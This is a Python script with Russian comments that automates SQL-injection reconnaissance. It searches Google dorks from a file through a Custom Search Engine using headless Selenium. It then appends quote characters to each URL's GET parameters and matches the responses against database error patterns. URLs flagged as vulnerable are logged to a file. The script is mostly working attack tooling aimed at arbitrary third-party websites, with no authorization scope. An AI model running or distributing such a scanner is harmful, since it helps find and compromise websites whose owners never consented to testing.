import re, requests, os, time
from selenium import webdriver
from bs4 import BeautifulSoup

# Список регулярных выражений свидетельствующих что на web-странице есть SQL уязвимость
sql_errors = {
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQL Query fail.*", r"SQL syntax.*MariaDB server"),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"Warning.*PostgreSQL"),
    "Microsoft SQL Server": (r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*odbc_.*", r"Warning.*mssql_", r"Msg \d+, Level \d+, State \d+", r"Unclosed quotation mark after the character string", r"Microsoft OLE DB Provider for ODBC Drivers"),
    "Microsoft Access": (r"Microsoft Access Driver", r"Access Database Engine", r"Microsoft JET Database Engine", r".*Syntax error.*query expression"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Warning.*oci_.*", "Microsoft OLE DB Provider for Oracle"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error"),
    "SQLite": (r"SQLite/JDBCDriver", r"System.Data.SQLite.SQLiteException"),
    "Informix": (r"Warning.*ibase_.*", r"com.informix.jdbc"),
    "Sybase": (r"Warning.*sybase.*", r"Sybase message")
}

# Функция которая получает HTML код web страницы и проверяет его на наличие ключевыъ слов
# свидетельствующих о наличии SQL иньекции, возвращает две переменные - True/False и тип уязвимой базы данных
def checksql(html):
    for db, errors in sql_errors.items():
        for error in errors:
            if re.compile(error).search(html):
                return True, db
    return False, None

# Создаём список опций для запуска Geckodriver в скрытом режиме
opts = webdriver.FirefoxOptions()
opts.headless = True
browser=webdriver.Firefox(options=opts)

# Открываем файл откуда будем брать дорки
f=open('dorks.txt','r',encoding='UTF-8')

# Открываем файл куда будем записывать найденные уязвимые URL адреса
f2=open('sqls.txt','w', encoding='UTF-8')

def checkcheck(url):
    # Заменяем в URL значок & между параметрами, добавляя перед ним одинарную кавычку
    # это нужно для тестирования GET параметров URL адреса на наличие SQL уязвимости
    x=url.replace("&","'&")
    # Очищаем URL от пробелов по обоим сторонам
    ur=x.strip()
    # Если спереди нету http то добавляем его
    if not(ur[0:4]=='http'):
        ur='http://'+ur
    try:
        # Получаем HTML код по URL
        s=requests.get(ur+"'")
        h=s.text
        # Проверяем на уязвимости
        a, b = checksql(h)
        print('Проверяю: '+ur+"'")
        if(a):
            print('Уязвим: '+ur+"'")
            soup = BeautifulSoup(h, "html.parser")
            title=''
            try:
                # Пытаемся вытянуть со страницы заголовок Title
                title = soup.find('title').text
                f2.write(ur+"'"+'|'+title+'\n')
            except:
                f2.write(ur+"'"+'|NOTITLE\n')
    except:
        pass

# Последовательно пробуем дорки из файла dorks.txt
for ddork in f:
    dork=ddork.strip()
    print('Проверяю дорк '+dork)
    # Если длина дорка достаточная (не пустая строка)
    if len(dork)>3:
        pred=''
        # Через Selenium заходим на Custom Google Search Engine
        browser.get('https://cse.google.com/cse?cx=009462381166450434430:dqo-6rxvieq')
        # Находим поле ввода поиска
        login=browser.find_element_by_name('search')
        # Вводим в поле поиска текущий дорк
        login.send_keys(dork)
        # Находим кнопку Search
        k=browser.find_element_by_css_selector('.gsc-search-button')
        # Нажимаем на кнопку
        k.click()
        # Делаем паузу в 3 секунды, чтобы страницв успела подгрузиться
        time.sleep(3)
        # Получаем ссылки поисковой выдачи в массив mas
        mas=browser.find_elements_by_css_selector('a[class="gs-title"]')
        for x in mas:
            # Получаем сам url каждой ссылки поисковой выдачи
            s=x.get_attribute('data-ctorig')
            try:
                # Очищаем url от лишнего
                s=s.strip()
                s=s.replace(' ','')
                s=s.replace('\n','')
                s=s.replace('\r','')
                # Используем переменную хранящую предыдущий url
                # чтобы не чекать одни и те же адреса дважды
                if ((len(s)>5) and (pred!=s)):
                    pred=s
                    # Проверяем очередной url
                    checkcheck(s)
            except:
                pass
        # Пытаемся последовательно получить ссылки с десяти первых страниц поисковой выдачи
        for number in range(2, 10):
            try:  
                nn=number+1
                # Находим ссылку на следующую страницу выдачи
                z='div[aria-label="Page '+str(nn)+'"]'
                k=browser.find_element_by_css_selector(z)
                # Жмем на ссылку 
                k.click()
                # Ждем пока прогрузится
                time.sleep(3)

                # Как и в коде выше получаем ссылки с поиковой выдачи и чекаем их на уязвимости
                mas=browser.find_elements_by_css_selector('a[class="gs-title"]')
                for x in mas:
                    s=x.get_attribute('data-ctorig')
                    s=s.strip()
                    s=s.replace(' ','')
                    s=s.replace('\n','')
                    s=s.replace('\r','')
                    if ((len(s)>5) and (pred!=s)):
                        pred=s
                        checkcheck(s)
                        f.write(s+'\n')
            except:
                print('Проверка дорка закончена')
                break

f.close()
f2.close()
# Закрываем браузер через Selenium
browser.quit()
    
    
